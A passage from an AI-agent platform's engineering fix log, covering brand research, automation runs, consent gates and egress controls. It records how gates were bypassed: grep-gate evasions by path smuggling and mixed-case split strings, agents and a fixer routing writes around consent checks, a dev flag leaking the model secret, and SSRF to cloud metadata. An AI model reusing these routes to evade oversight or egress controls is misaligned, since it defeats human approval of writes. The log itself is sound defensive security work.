  agent carries no auth (and must NEVER carry a user JWT in an agent transcript - it would
  authenticate on every API route). Fixed with a PURPOSE-SCOPED preview token
  (`services/preview-token.ts`: HMAC capability `pv1.<artifactId>.<exp>.<mac>`, not a JWT,
  grants viewing ONE artifact's served document for the verify window): verify-runner appends it
  to the URL; serving.ts accepts it in the owner-bypass ahead of the user-JWT path. Verdict notes
  are now requested in PT (they surface to the end user). Tests: preview-token expiry/tamper +
  resolveVerifyUrl token cases in `api/tests/apps/verify-runner.test.ts`.
- **`app-pdf-endpoint-never-mounted`** (CAUGHT BY THE NOW-WORKING VERIFIER, live 2026-07-11:
  "o botão 'Descarregar PDF' não funciona — o servidor retorna um erro 404") - the injected
  `window.__ekoa.exportPdf` client was carried in the port but its endpoint `POST /api/app-pdf`
  (and the `/artifact-pdfs` static mount) never were: EVERY in-app document export 404'd since
  rc-1. Ported from old cortex into `apps/pdf.ts`: `renderAppDocumentPdf` (page JS disabled,
  subresource allowlist blocking private ranges/metadata, injected `<base>`, embedded print
  reset, @page-aware margins) + `appPdfRouter` (X-Ekoa-App-Id scoping, html required, 4MB cap)
  + both mounts in server.ts. Contract test: `api/tests/contract/app-pdf.test.ts`. Second-order
  fix in the same class: agent-written `@import '/api/design-tokens.css'` failed the whole
  esbuild bundle ("could not resolve") - server-absolute paths are now treated as runtime URLs
  (CSS externals / JS stubs) in builder.ts's resolver, and the coding-agent content now says the
  tokens are auto-linked in index.html and must never be imported.
- **`brand-consent-overlay-polluted-vision`** (found during the live re-verify) - plmj.com's
  Cookiebot overlay covered the header strip, so the logo-vision ground truth showed a cookie
  banner and the rendered harvest scored a team-PORTRAIT carousel into the top tier (position +
  aspect alone). Fixed: `consent-chrome.ts` (shared vendor-token list + in-page removal) runs
  before EVERY rendered pass (colours, logo harvest, header shot, visual-vibe screenshots);
  harvest candidates now require a STRUCTURAL logo signal (logo attrs / header-nav / home-link)
  to qualify, and photo JPEGs are score-penalized. Re-verified live: the vision gate then
  correctly overrode dembrandt's white-on-white candidate to the REAL PLMJ wordmark, and the
  header logo swapped in live (`navigations: 1`, no reload).
- **`brand-assets-url-keyed-cache-staleness`** - stored assets were keyed by md5(source URL), so
  a re-research whose logo changed at the same URL kept the same `/brand-assets/<hash>` path and
  every browser served its stale cached copy. Now keyed by md5(CONTENT).
- **`dev-harness-30s-health-window`** - `scripts/dev-api.mjs` killed healthy API boots at 30s while
  a cold boot registering ~200 featured apps takes ~90s. Now 120s default (`DEV_API_HEALTH_TIMEOUT_MS`
  override); the run-skill driver's API window raised to 180s.

## Recently fixed - 2026-07-11 stabilization run

- **`brand-research-site-blind`** (operator-reported, 2026-07-11) - brand research "saved nothing
  from the site": the agent was TOOL-LESS *and* model-knowledge-only, so it never touched the
  target website, never saved a logo, and never produced a design system - it emitted a plausible
  palette from memory and the job's `summary`/`confidence` were the only real output. Fixed by
  porting the REAL cortex pipeline as deterministic SERVER-SIDE services (`api/src/services/branding/`):
  `fetchSiteContext` (HTML + linked-CSS scrape: title/meta/generator, CSS colour + font candidates),
  `fetchRenderedCandidates` (headless-Chromium area-weighted painted colours + fonts),
  `fetchDesignSystem` (the `dembrandt` 0.23 CLI: confidence-scored palette, CSS variables, typography,
  spacing, radii, shadows, button styles, frameworks), `fetchVisualVibe` (hero/mid/footer screenshots
  → vision one-shot → mood/shape/density/texture/hero), plus website-builder chrome detection/scrub so
  a Webnode/Wix promo stripe never masquerades as the brand. The agent STAYS tool-less (§5.6.4
  anti-injection): all site access is server code, the model receives a server-built snapshot and
  returns constrained JSON grounded "usa APENAS a informação do snapshot". The orchestrator
  (`agents/brand-research.ts`) now: fetch site-context → (parallel) rendered + dembrandt + vibe →
  grounded `runOneShot` → resolve + STORE a real logo file under `/brand-assets/<file>` (SSRF-guarded
  download, content-type + size cap) → merge colours/fonts/tone/instructions + `designSystem` +
  `visualVibe` + `logo` onto `org.branding`. Site unreachable → honest degradation to the
  knowledge-only prompt, noted on the job (`siteReachable: false`). All server fetches of the
  user-supplied URL go through the SSRF guard (new `guardedFetchFollow` re-validates each redirect
  hop); the dembrandt URL is guard-validated BEFORE the subprocess spawns. `shared/OrgBranding`
  gained optional typed `designSystem` (StoredDesignSystem) + `visualVibe` fields (the dashboard
  Design System tab already reads them). Covered by 6 unit suites under
  `api/tests/services/branding/` + the extended `api/tests/contract/branding.test.ts` (reachable-site
  run merges colours + designSystem + visualVibe + a stored logo; unreachable degrades to knowledge).
  Decision logged in `docs/decisions.md`. LIVE-VERIFIED 2026-07-11 against plmj.com: real logo stored
  and served at `/brand-assets/...`, real brand colours (`#110088` navy + `#a90707` red), real fonts
  (Domaine Display + GT America), a populated Design System tab (palette + typography + visual vibe),
  visible in the Marca preview. Three follow-up fixes made during that live verification:
  (a) **vibe screenshots exceeded the 32MB provider request cap** ("Request too large") - three
  viewport PNGs of a photo-heavy site are multi-MB base64; switched the vibe captures to JPEG q60
  (`api/src/services/branding/visual-vibe.ts`), which keeps each shot in the low-hundreds-of-KB.
  (b) **cookie-consent vendor chrome leaked into the palette** - dembrandt colours whose sources were
  all `cybotcookiebotdialog...`/OneTrust/etc. were surviving; added a builder-independent
  consent-chrome source filter in `filterDesignSystemChrome`, AND made `scrubBuilderChrome` always run
  the design-system filter (it previously early-returned when NO site-builder was detected, so custom
  sites like plmj.com were never scrubbed). (c) A `manifest:theme_color` white legitimately survives
  (mixed owner source) - by design. Covered by new cases in the design-system + snapshot suites.
- **`gateway-empty-text-block-cache-control`** (vision-discovered, walkthrough 2026-07-11) - the
  Agent SDK intermittently appends an EMPTY text block that still carries a `cache_control`
  breakpoint on multi-turn chat runs (reproduced deterministically on the integration-build
  handoff two-turn handshake). The OAuth beta endpoint 400s
  `messages.N.content.M.text: cache_control cannot be set for empty text blocks`, killing the whole
  turn - so the integration-builder generation failed every time while plain builds and single-turn
  chat were unaffected. Fixed at the egress chokepoint (`proxyGatewayMessages`, the last place we
  control before the provider): `stripEmptyTextBlocks` scrubs empty text blocks out of the
  forwarded `messages`/`system`, guarded so a message is never left with an empty `content: []`.
  Covered by `api/tests/llm/gateway-payload-allowlist.test.ts` (3 cases: scrub-alongside-real,
  never-empty-the-array, plain-string-passthrough). Live-verified: the same handoff that 400'd now
  reaches `package-ready` with a Save button. Decision logged in `docs/decisions.md`.
- **`run-activity-bar-word-wrap`** (vision-discovered, walkthrough 2026-07-11) - the automation
  rehearsal activity bar rendered the fixer commentary one-word-per-line: `Headline`/`Subline`/
  `ResolutionLine` sat as siblings in the flex-row `BarWrapper`, so a long failure message squeezed
  the headline to content-width. Fixed by wrapping the text block in a `min-w-0 flex-1` column in
  the `fixing-step` and `running-step` branches (`web/components/automations/run-activity-bar.tsx`).
  Evidence: walkthrough `stabilization-verification/2026-07-11_11-26-17` (pre-fix state on camera).
- **`chat-turn-no-progress-indicator`** (vision-discovered, walkthrough 2026-07-11) - plain chat
  turns showed NO indicator between send and the first streamed chunk (the whole knowledge-search
  phase was a blank screen): the progress indicator required `sessionJob`, which only build
  sessions have. Fixed: `isExecuting && (sessionJob || !isBuildSession)`
  (`web/components/builder/chat-panel.tsx`), so chat turns show "A pensar..." + elapsed time
  immediately. Evidence: walkthrough `2026-07-11_11-44-28` (blank) vs `2026-07-11_11-49-20` (fixed).
- **`automation-step-events-thin`** (operator-reported, 2026-07-11) - a regression vs old cortex: the
  automation run's `step` SSE event dropped everything but `{runId, stepIndex, status}`, so per-step
  screenshots captured + persisted server-side (`writeStepScreenshot`) never reached the run viewer,
  and there was NO `express.static('/automation-screenshots', ...)` mount - even the already-emitted
  `pause_for_user` screenshot URL 404'd. Fixed by (a) extending the shared `AutomationRunEvent.step`
  member + `RunRecord` with the optional enrichment (`stepId/tier/error/errorDetails/screenshotUrl/
  output/durationMs`; `errorDetails` is the executor's already-redacted+bounded integration/api
  request-response that lights up the live IntegrationErrorPanel; per-step `RunStepRecord` with a
  served `screenshotUrl`), (b) a pure, unit-tested
  mapper `automationStepEventPayload` (api/src/automation/run-events.ts) the composition-root emitter
  now forwards, (c) mounting `/automation-screenshots` on `automationRunsRoot()` mirroring the
  `/artifact-screenshots` precedent, and (d) serializing steps (with `screenshotUrl`) in `toWireRun`
  so `GET /runs/:id` + the Histórico drill-in render thumbnails without knowing the disk layout. The
  disk-path -> served-URL map lives in ONE helper (`screenshotUrlFromPath`). Covered by
  `api/tests/automation/run-events.test.ts`, `api/tests/contract/automation-screenshots.test.ts`, and
  shared `contract.test.ts` (thin+enriched parse). Decision logged in `docs/decisions.md`. Remaining
  for live verification: a real automation run driven end-to-end (operator session).
- **`automation-vision-empty-screenshot`** (operator-reported, 2026-07-11) - a browser/verify step
  could hand the vision tier an EMPTY screenshot (a `page.screenshot()` that failed on the local
  session, or a daemon observation envelope missing `screenshotB64`); the model then answered
  `confidence:'low'` and the engine refused ("No screenshot was provided"), burning the fixer budget
  blind and crippling self-recovery. Fixed with a guard (`screenshotForVision` in engine.ts): on an
  empty capture, force ONE fresh `observe()` and re-read; if still empty, fail the step RECOVERABLE
  with a user-grade PT message ("captura de ecrã indisponível - o passo não pode ser resolvido
  visualmente") so the fixer/pause machinery handles it - the model is never asked to work blind.
  Belt-and-braces: `LocalBrowserSession.capture()` now retries the screenshot once after a settle and
  only keeps a NON-EMPTY capture; `resolvePlaywrightAction`/`verifyOutcome` throw on an empty image
  (documents the invariant). Covered by two `api/tests/automation/engine.test.ts` cases (browser +
  verify: no blind vision call, recoverable PT failure). LIVE-VERIFIED 2026-07-11 (DRE-search
  automation): per-step screenshots stream into the run viewer AND the Histórico drill-in; step
  screenshots serve 200 at `/automation-screenshots/<automationId>/<runId>/step-N.png`; the run
  completed with no blind-refusal. One more display fix made during that run: the verify-failure
  prefix was still English (`outcome not met:`) - now PT (`resultado não atingido:`) in
  `engine.ts` (the one test asserting the prefix updated).
- **`automation-run-surfaces-word-wrap`** (operator-reported, 2026-07-11) - extends
  `run-activity-bar-word-wrap` to the terminal states + the run viewer: the completed/failed activity
  bar and the run-viewer run-level + per-step error surfaces rendered long unformatted text that
  ballooned the layout. Fixed with `min-w-0 break-words` + `line-clamp` (2-3 lines, full text on
  `title`) on the completed/failed `Headline` detail (`run-activity-bar.tsx`) and the error blocks
  (`run-viewer.tsx`). Also: the vision resolver/verifier/fixer/classifier prompts now instruct the
  model to write human-facing free-text (reasoning, userInstructions) in pt-PT while keeping all JSON
  keys/enums in English.

- **`apps-embed-frame-headers`** - the `/apps/*` embed surface now answers CSP
  `frame-ancestors 'self'` + the configured dashboard origins (`EKOA_DASHBOARD_ORIGINS` csv ->
  `EKOA_APP_ORIGIN` -> dev localhost:3000; invalid entries dropped) with NO `X-Frame-Options`;
  the dashboard CSP gained `frame-src`/`img-src` for the api origin. The preview iframe renders
  live and is pinned by e2e. Other planes unchanged (API `'none'`+DENY, served `'self'`+SAMEORIGIN).
- **`registo-targetIds`** - `registoEntry.targetIds` emitted the metadata object where the schema
  wants `array(Id)`, failing `RegistoListResponse` validation; now derives ids from id-keyed metadata.
  Verified live.
- **`/users` + `/usage` crashes** - undefined `.toLocaleString()`; `adminListUsage` now left-joins
  users and emits the full gauge surface, `fmtTokens` on totals.
- **integrations page crash** - the session stub now answers `sessionConnect` + `actions`
  (`SessionCaptureStatus` carries both).
- **artifact versions 500** - `readVersions` graceful dual-jail for never-built artifacts and the
  featured list. (Featured-artifact `restoreVersion` remains open - see `restoreVersion-featured-500`.)
- **`knowledge.listUploads`** `_id`->`id`; **`ekoaLocal.llmModels`** `{data}` envelope; **servedApp**
  `appDataList`/`appSharedList` envelope - contract fold-ins.
- **artifact thumbnails** - previously unimplemented; now end-to-end (build-mechanics screenshot seam,
  `/artifact-screenshots` static mount, `Artifact.screenshotUrl`, dev CSP `img-src`).
- **automations planner failures** - TRUE ROOT CAUSE: the SDK option was `customSystemPrompt`, ignored
  by Agent SDK 0.2.118 (the option is `systemPrompt`), so EVERY system prompt was silently dropped on
  the live path - the planner never saw the required JSON shape. Fixed, plus `runOneShot` `maxTurns`
  1->3 for thinking-heavy EXPERT one-shots, plus a distinct `plan_unavailable` wire status for egress
  outages (never "reformule o objetivo" for a dead transport).
- **brand research not persisting** - the agent now emits a structured `BrandResearchResult` that is
  merge-written onto `org.branding`.
- **gateway always-FAST clamp** - amended: a request whose model matches one of the three configured
  tier models now runs AND meters at that tier (EXPERT ~20x FAST cost - deliberate); other models keep
  the FAST clamp. This un-starved the strict-JSON EXPERT planner and thinking-heavy builds.
- **`<ekoa-context>` reinjection** - the persisted context block was never re-injected on the next
  turn; now re-injected (`agents/context.ts`).
- **thinking channel** (2026-07-10) - intermediate commentary self-identifying as the engine briefly
  flashed unredacted; now a first-class `thinking_chunk` channel, server-side branding-redacted, and
  `result.text` is answer-only (which also fixed the persisted-answer contamination).

## Previously fixed - rc-1 release hardening + batch-final (2026-07-08..10)

All fixed-verified with committed tests: **F1** (auth lifecycle - refresh/logout/password/device +
jti revoke), **F2** (credential provisioning + live turn), **F3** (Registo CRUD/login/build write
coverage, metadata-only, org-scoped), **F4** (branding research + `PUT /branding` alias), **F5**
(UI-called endpoints mounted + mount-coverage drift gate), **F6** (terminal JSON-envelope 404),
**F7** (honest failed-build serving state + `Job.error`), **F10** (per-org deny-list resolver wired +
org-admin CRUD + live masking proof), **F11** (session rename `name`/`title` + `createdAt`/`updatedAt`),
**F13** (stale `credentials.ts` header), **F16/F28** (build served the untouched scaffold and verify
passed it - `BUILD_UNFULFILLED`/`VERIFY_FAILED` terminals + live J3 re-proof), **F20** (chat result
truncation - persisted == concatenated chunks), **F21** (memory recall injection wired + backfilled
test), **F22** (`memoryView` omitted `orgId`/`tags` - `/memory` rendered 0 cards), **F23** (7 console
errors on `/memory`), **F25** (host-context bleed - mechanism reproduced, hardened, accepted residual
documented), **F26** (de-anon round-trip broken by model whitespace reformatting - format-tolerant
detokenizer + 13k-case security property), **F29** (automation plan-from-goal 500 -> structured
`plan_failed` 200). **F19** was a verified billing PASS (no fix).

## Accepted / by-design / won't-fix

- **collections-engine access rules defined-not-enforced** (tracked `docs/decisions.md` 2026-07-07).
  The per-collection `access`/`declaredOnly`/field/size rules are defined in
  `data/collections-engine.ts` but not threaded end-to-end: no producer (app manifest) declares
  `collections`, so the plane runs at the safe default (schemaless, 256 KiB, app-scope). Not
  exploitable. Close both halves together when a producer lands: wire the manifest's `collections`
  block onto `artifact.collections` AND thread the resolved rule into the engine + gate `access`
  levels in `served-data.ts`.
- **served-app per-app data plane open posture** (by-design). `/api/app-data` is unauthenticated app-
  global storage scoped only by `X-Ekoa-App-Id`, carried verbatim for byte-compatibility; private data
  belongs on the server-authenticated shared/JWT/SSO planes. Documented in `docs/security.md`.
- **`docx-clean-drops-comments`** (accepted, kept deliberately; found by the 2C-S7 docx gate,
  2026-07-25). `POST /api/app-docx/clean` (`document-source.getClean` ->
  `docx-redline.acceptAllRevisions`) returns a document with NO comments: @adeu/core 1.28.0's
  `accept_all_revisions` strips `word/comments.xml`, `commentsExtended.xml`, `commentsIds.xml`,
  `commentsExtensible.xml` AND the in-document `commentRangeStart/End/Reference` anchors. **Word
  itself keeps comments when you accept all changes**, and ekoa-dev's `word-track-changes.md`
  asserted comments survive - that claim was never tested (dev's `acceptAllRevisions` is
  byte-identical to ours and its test only checked for the absence of `w:ins`/`w:del`), so the port
  inherited a false doc, not a regression. KEPT rather than worked around: the clean copy is the
  "final version to send out", and shipping internal review notes to a counterparty is a real legal
  risk. The WORKING copy (`GET /api/app-docx/current`) is unaffected and carries everything. Pinned
  as a tripwire in `api/tests/apps/docx-word-gate.test.ts` (a future engine bump or a deliberate fix
  turns it red, so the lawyer-facing download can never change silently) and documented in
  `docs/word-track-changes.md` §2.4 + the `getClean` header.
- **subprocess PATH home-path residual** (by-design). The agent subprocess inherits the operator's
  home on `PATH`; accepted residual from the F25 hardening (disposition doc committed).
- **`sweepOrphans` boot-recovery gap** (accepted). Boot-time crash recovery flips orphaned jobs to
  `failed{ORPHANED}` without a Registo row; guaranteed-once holds on the normal live path.
- **F9** (won't-fix-minor). Trigger disable (410) is unreachable over the API (delete-only lifecycle).
- **F24** (won't-fix-minor). Extraction can persist a markdown-only junk memory (`**`).
- **F27** (won't-fix-minor). `GET /registo?type=anonymisation` returns 0 rows - filter-granularity
  confusion (the qualified query returns all rows); not a missing row.
- **F30** (won't-fix-minor). Builds do not emit a `memory-extract` billing row (build post-run
  extraction differs from the chat path).
- **served-app assistant "Fontes" can contradict the reply** (open; found by D2 fresh review, 2026-07-13; CONFIRMED harder by D3 live evidence: 5 authoritative-looking Acórdão citations rendered directly under an explicit "não posso responder" refusal — slices/D3 live-04-fontes.png of run 20260712-150958-4bb23640).
  `runAppAssistant` returns ALL grounding hits as citations (`api/src/apps/app-assistant.ts`
  `grounding.citations`), not the sources the model actually used - the live D2 evidence shows a
  reply saying the excerpts were not used while five "Fontes" render under it. Trust-eroding for a
  cite-your-source legal product. Candidate fix: emit only reply-referenced citations, or suppress
  the list when the model states it grounded on nothing. Owner: D3/F-slice follow-up on the
  operator-run branch (or platform, whichever lands first).
- **served-app anonymous `whoami` logs a console 401** (open platform nit, surfaced by the D2 strict
  console gate, 2026-07-13). `injected-context.ts:110` fetches `/api/app-sso/me`; for an anonymous
  visitor it 401s and the browser logs the failed resource on EVERY served app load. Candidate fix:
  200 `{user:null}` for anonymous (contract response is `z.unknown()`, additive). Until fixed, the
  D2 e2e allowlists exactly this signature (documented in `api/tests/e2e/assistant-panel.e2e.mjs`).
- **served-app health beacon 502 through the dev proxy** (open platform nit, surfaced by the D2
  strict console gate, 2026-07-13). `injected-context.ts:244` POSTs `/api/app-health`; through the
  dev proxy (:4111) it 502s and logs a console error on load. Likely a dev-proxy forwarding gap
  (relates to d55bd02). Prod path unverified. Allowlisted (documented) in the D2 e2e only.

## F-2026-07-18-invalid-date-cards (open, cosmetic)
Artifact cards on /artifacts render "Invalid Date" for dev-seeded artifacts whose createdAt is
empty (visible in the OS-mode walkthrough, classic beats). Real user-created artifacts carry
timestamps; the fix is either seeding createdAt in the dev fixtures or formatDate falling back
to a dash for missing dates. Surfaced by the walkthrough vision pass; needs a deterministic
close (unit on formatDate fallback) or a written dismissal.

## F-2026-08-03-chokepoint-gate-bypasses (FIXED)

The chokepoint grep gate (`scripts/chokepoint-grep.sh`, `npm run gate:chokepoint`, in CI) was
bypassable four ways after the widening recorded above. A fresh-context verifier reproduced each by
running the real script; each was re-reproduced before the fix and re-run after. All four are closed
and pinned by `api/tests/security/grep-gates.test.ts`, which executes the REAL script against
planted violations. Revert-verified: five scripted reversions, each turning the matching case red.

- **`chokepoint-marker-smuggled-into-a-path`** (FIXED 2026-08-03, CRITICAL, gate bypass). The
  allow-marker was filtered with `grep -v 'chokepoint-gate-allow'` over the whole
  `path:line:content` output line, so the marker matched in the PATH as well as the content:
  `api/tests/chokepoint-gate-allow/p.ts` (a DIRECTORY) or `api/tests/x/chokepoint-gate-allow.ts` (a
  FILE) exempted itself, and a directory exempted an unbounded subtree. That defeated both
  properties the marker was introduced with: exemption is one LINE, and `grep -rn` over content
  enumerates every exemption. FIXED: an awk filter splits `path:line:content` and matches the marker
  against the CONTENT ONLY (path exemptions are matched against the PATH field, anchored). Pinned by
  "the allow-marker cannot be smuggled into a DIRECTORY name" / "... into a FILE name".

- **`chokepoint-gate-was-case-sensitive`** (FIXED 2026-08-03, CRITICAL, gate bypass). The needle had
  no `-i` while the script's own comment claimed "case-insensitive", so
  `https://api.Anthropic.com/v1/messages` passed the gate. DNS is case-insensitive, so that URL
  resolves and works: exactly the raw-fetch class the gate exists to catch. `'@ANTHROPIC-ai/sdk'`
  and `'ANTHROPIC.COM'` passed too. Worse, the two exemption filters used `-iv`, so the
  case-insensitivity was on the WRONG side of the fence: `api/src/LLM/` and `api/tests/LLM/`
  inherited the chokepoint module's exemption. FIXED by splitting the gate into the two passes its
  comment always claimed: PASS 1 matches the banned references themselves (`@anthropic-ai`,
  `anthropic.com`) CASE-INSENSITIVELY over every root; PASS 2 is the broad lowercase `anthropic`
  token as a split-string net. The path exemptions are now case-SENSITIVE and anchored. Pinned by
  "an UPPER-CASE provider host fails", "an UPPER-CASE package scope and a bare upper-case host both
  fail", and "the PATH exemptions are case-SENSITIVE".

  KNOWN RESIDUAL, accepted deliberately: pass 2 stays case-SENSITIVE. The word legitimately appears
  ~40 times outside `api/src/llm/` in two shapes that are not egress and cannot be removed - the
  capitalised proper noun in doc comments and UI copy ("Anthropic-compatible clients", including
  `shared/`, `server.ts` and the locales), and the SCREAMING_SNAKE env identifiers
  `ANTHROPIC_BASE_URL` / `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY`, of which `ANTHROPIC_BASE_URL`
  is the mechanism CLAUDE.md MANDATES for pointing a subprocess AT the chokepoint. A case-insensitive
  pass 2 would mean ~40 line markers, turning the marker into furniture and destroying the property
  that `grep -rn chokepoint-gate-allow` is a short readable enumeration. The cost is that a literal
  that is BOTH split AND mixed-case (`'api.' + 'Anthropic' + '.com'`) evades both passes; so does
  charcode obfuscation, which no grep gate can see. The ESLint import ban and review are the other
  layers. Pinned in the other direction too ("the sanctioned wiring identifier and prose do NOT trip
  it"), so a future widening has to confront the trade-off rather than discover it.

- **`chokepoint-gate-scanned-a-root-that-does-not-exist`** (FIXED 2026-08-03, HIGH, gate coverage).
  The script scanned `web/src`, WHICH IS NOT A DIRECTORY (the real roots are `web/app`, `web/lib`,
  `web/components`, `web/stores`, `web/hooks`, `web/locales`, `web/types`, plus `web/e2e`,
  `web/__tests__`, `web/scripts`), while the comment the previous commit wrote claimed "so a raw
  provider reference cannot hide in the frontend". Probes planted in `web/lib/` and `web/app/` both
  passed. `scripts/`, `api/scripts`, `api/assets` (first-party served runtime bundles) and
  `clients/` (a SHIPPED CLI workspace) were unscanned too. FIXED: the root list is now every
  first-party source root, and - the actual root cause - A DECLARED ROOT THAT IS NOT A DIRECTORY NOW
  FAILS THE GATE. A missing root used to be scanned as empty, i.e. reported clean; that is how
  `web/src` hid the whole frontend for as long as it did. Widening surfaced 5 new hits, all in web
  and all triaged as anti-leak enforcement (the token is the needle of a check that the name is
  ABSENT): `web/lib/sanitize-error.ts` (the provider-leak denylist), `web/e2e/chat-thinking.spec.ts`
  (x2), `web/__tests__/sanitize-error.test.ts`, `web/__tests__/components/thinking-block.test.tsx`.
  Each got a same-line marker; no real violation was found and nothing was weakened to make it pass.
  Pinned by "EVERY declared root is really scanned" (one probe per root), "a violation in the
  FRONTEND, in scripts/ and in the shipped clients/ CLI fails on the real tree", "a DECLARED ROOT
  THAT DOES NOT EXIST fails the gate" and "every declared root really exists in the repo".

- **`ekoa-llm-direct-really-does-bypass-the-chokepoint`** (RECORDED 2026-08-03, MEDIUM, honest
  labelling - NOT a shipped bypass, behaviour deliberately unchanged). `api/tests/journeys/boot-b.mjs`
  justified its allow-marker by claiming `LLM_CHOKEPOINT_BASE_URL` is "the CHOKEPOINT'S OWN
  destination ... never a route around it". That is FALSE, and the finding above repeats it.
  `api/src/config.ts:297` feeds the variable to `llm/credentials.ts:isLocalGatewayChokepoint()`,
  which is true ONLY for a loopback host; pointed at the provider it is false, so
  `buildSubprocessEnv` (`llm/credentials.ts:387,395`) stops injecting the boot-provisioned GATEWAY
  key and injects the REAL MODEL CREDENTIAL (`CLAUDE_CODE_OAUTH_TOKEN` / `ANTHROPIC_API_KEY` = the
  secret), and sets the subprocess's `ANTHROPIC_BASE_URL` to the provider. `EKOA_LLM_DIRECT=1`
  therefore spawns SDK subprocesses pointed straight at the provider carrying the model secret: no
  gateway, no anonymisation pipeline, no attribution or metering - verbatim what CLAUDE.md's
  egress-chokepoint rule forbids. It is NOT a shipped bypass: opt-in, default off, in a dev journey
  harness product code never imports, set by no CI lane (`grep -rn EKOA_LLM_DIRECT`), and its one
  use is watching live token streaming that the gateway path buffers by design. Its BEHAVIOUR is
  deliberately unchanged; what changed is that the comment now says what it does, at both marker
  sites, and it is recorded here so it is discoverable rather than buried in a marker. If the dev
  need for live streaming is ever solved on the gateway path, delete the flag.

## F-2026-08-03-ungated-write-rails (C2 follow-up; four FIXED, one OPEN)

The C2 fresh-context reviewer confirmed the Action write gate is solid on the rail it covers, then
enumerated five more surfaces that reach the same effect with no gate at all. Four are closed here;
the fifth is recorded OPEN because the complete fix belongs in a file this slice does not own.

- **`platform-actions-were-completely-ungated`** (FIXED 2026-08-03, CRITICAL, unapproved writes on
  the org's managed OAuth connection). `google-workspace` / `microsoft-365` short-circuit to
  `callPlatformIntegration`, from `automation/engine.ts` (the `integration` step), the artifact
  `integration.call` primitive, the listener supervisor's poll, chat prefetch and email hydration.
  None of those paths consulted any approval, so RUN_SPEC criterion 6 - "a write requires human
  confirmation" - was simply FALSE for the mailbox, calendar, Drive and OneDrive of every connected
  org: 14 mutating Google actions (`send_email`, `send_email_simple`, `create_event`,
  `update_event`, `delete_event`, `create_doc`, `write_doc`, `create_sheet`, `append_sheet`,
  `modify_email`, `batch_modify_emails`, `trash_email`, `create_task`, `complete_task`) and 3
  Microsoft ones (`send_email`, `create_event`, `create_file`), executable with zero confirmation by
  any org member who could drive an automation or an artifact. FIXED by enforcing C2's
  `checkActionConsent` inside `callPlatformIntegration` itself, keyed on a build-time allowlist of
  READ actions that must AGREE with the definition's `mutates` (decisions.md 2026-08-03), before any
  OAuth token is read. Pinned by `api/tests/security/platform-write-gate.test.ts` (19 cases:
  allowlist-vs-shipped-package drift in both directions, fail-closed on unknown key/action/`mutates`,
  refusal with no provider call, cross-org / cross-user / cross-action / TTL non-transferability,
  reads still auto-running) and `api/tests/automation/platform-primitive-write-gate.test.ts` (the
  artifact rail through the real seam body, plus the composition-root wiring guards).

- **`api-call-steps-were-a-fifth-write-rail`** (FIXED 2026-08-03, HIGH, gate bypass by step type).
  `automation/executors/api-call.ts` performed any HTTP method with `authIntegrationKey` credentials
  injected and no consent check, so an agent refused at the Action gate could author the same write
  as a step one type over. FIXED: a non-idempotent method (anything outside `GET`/`HEAD`/`OPTIONS`,
  and an absent/unrecognised method) now needs a human, checked BEFORE the credential load so an
  unapproved write never decrypts a secret, through the automation tier's existing consent module
  (decisions.md 2026-08-03 for why not C2's store). Pinned by
  `api/tests/security/api-call-write-gate.test.ts` (12 cases incl. "no credential read on refusal",
  shape drift on url/body/header/method/credential/bodyKind, cross-user, cross-org, once-vs-always).
  BEHAVIOUR CHANGE, deliberate: an existing automation with a POST/PUT/PATCH/DELETE `api_call` step
  now asks once per shape - dialog on an attended run, refusal on an unattended one - instead of
  running silently.

- **`awaiting-consent-was-not-a-pause-and-the-fixer-could-rewrite-around-it`** (FIXED 2026-08-03,
  HIGH). `engine.ts` paused only on `recoverable === false`, and the consent refusal's message does
  not match `/not connected/i`, so an unapproved write ended the run as `failed` (a state a caller
  retries) rather than as something a human is asked to answer. On the step types the fixer does
  handle it was worse: `rehearsal.ts` let `replace_current` substitute an arbitrary `Step`,
  INCLUDING an `api_call` performing the same write with no gate - the machinery meant to repair a
  run could route around the gate that stopped it. FIXED in three places: both integration rails now
  carry the executor's CODE on `details` (the composition root's platform binding previously dropped
  it) and the engine classes the refusal structurally, not by prose; both refusals are
  non-recoverable so `shouldAttemptFix` never invites the fixer; and the fixer's step vocabulary is
  narrowed to the four types `FIXER_SYSTEM` actually documents. Pinned by the write-rail block in
  `api/tests/automation/engine.test.ts` and the vocabulary block in
  `api/tests/automation/rehearsal.test.ts` (incl. "an effect payload cannot ride along on an
  accepted step type").

- **`builder-test-endpoint-was-an-unguarded-egress`** (FIXED 2026-08-03, HIGH, SSRF). 
  `POST /api/v1/integration-builder/test` ran a model-authored `httpConfig` on a BARE `fetch` while
  its own docblock claimed it matched the action executor's `guardedFetch` posture. Any
  authenticated user could point it at `http://169.254.169.254/`, loopback, or any RFC1918 address
  the API host can reach. FIXED with `guardedFetch` + the no-echo refusal, no transport seam and no
  environment exemption. Pinned by `api/tests/security/builder-test-ssrf.test.ts` (8 cases against
  the route's real default). The WRITE-GATE half was deliberately not applied - see decisions.md
  2026-08-03 for the argument (synchronous human caller, own session, caller-supplied credentials,
  nothing stored spent; and gating an unsaved session package would be a ban, not a gate).

- **`consent-target-shows-an-uninterpolated-template-and-config-can-redirect-it`**
  (**FIXED 2026-08-04**, was MEDIUM, consent integrity - found by a live vision-driven run against a
  REAL third-party integration, not by a suite). Two halves of one problem, both reproduced end to
  end on the running stack with a real ntfy.sh account and a real gateway key.
  CLOSED by keying an approval on (org, user, integration, action, SHAPE, **DESTINATION**), where
  the destination is the RESOLVED target. It resolves from `publicConfigValues` - a plaintext
  projection of the values the definition's `configSchema` does NOT mark secret - so the gate still
  answers BEFORE any credential is decrypted and C2's ordering is intact; a secret in a destination
  renders as `••••` and is never resolved into a dialog. Deliberately NOT a hash of the credential
  blob: the envelope is non-deterministic, so that would make every routine OAuth refresh revoke
  every standing approval. `actionShape` is untouched, so D3's authoring/trust fingerprint keeps its
  meaning. Suite: `api/tests/security/consent-destination-binding.test.ts` (7 cases; removing the
  destination from the approval key was reverted-and-verified to turn the redirect case red).
  RE-VALIDATED LIVE after the fix: the dialog now shows
  `VAI EXECUTAR POST https://ntfy.sh/<real topic>`, moving the topic returns 403 `awaiting_consent`
  with the re-prompt naming the NEW destination and nothing published, and restoring the approved
  destination works again without re-approving.
  (a) THE DIALOG SHOWS A PLACEHOLDER. `actionTarget()` renders `httpConfig.baseUrl + path`
  VERBATIM, so for any action whose path is templated the human is asked to authorise
  `VAI EXECUTAR POST https://ntfy.sh/{{ntfy_topic}}`. C2's requirement is that the dialog names the
  real destination "not a paraphrase"; a raw placeholder is strictly less than a paraphrase. The
  shipped Slack package hides this because its baseUrl and path are both literal.
